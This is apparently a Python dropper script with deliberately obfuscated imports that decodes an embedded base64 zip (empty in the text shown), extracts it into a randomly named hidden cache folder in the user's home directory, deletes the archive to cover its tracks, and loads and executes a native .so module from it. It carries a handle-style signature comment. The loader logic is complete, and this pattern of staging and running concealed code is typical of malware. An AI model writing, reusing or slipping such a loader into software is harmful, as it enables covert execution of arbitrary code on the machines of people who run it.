import os as o, base64 as b, zipfile as z
from importlib.util import spec_from_file_location as s, module_from_spec as m

d = ''

def x():
    p = o.path.join(o.path.expanduser("~"), ".cache_" + o.urandom(2).hex())
    o.makedirs(p, exist_ok=True)
    dvmb = o.path.join(p, "dvmb")

    with open(dvmb, "wb") as f: f.write(b.b64decode(d))
    with z.ZipFile(dvmb, "r") as zf: zf.extractall(p)
    o.remove(dvmb)

    for i in o.listdir(p):
        if i.endswith(".so"):
            modpath = o.path.join(p, i)
            modname = i.split(".")[0]  
            s_ = s(modname, modpath)
            m_ = m(s_)
            s_.loader.exec_module(m_)
            break
# ‚Äî @uouch
if __name__ == "__main__":
    x()
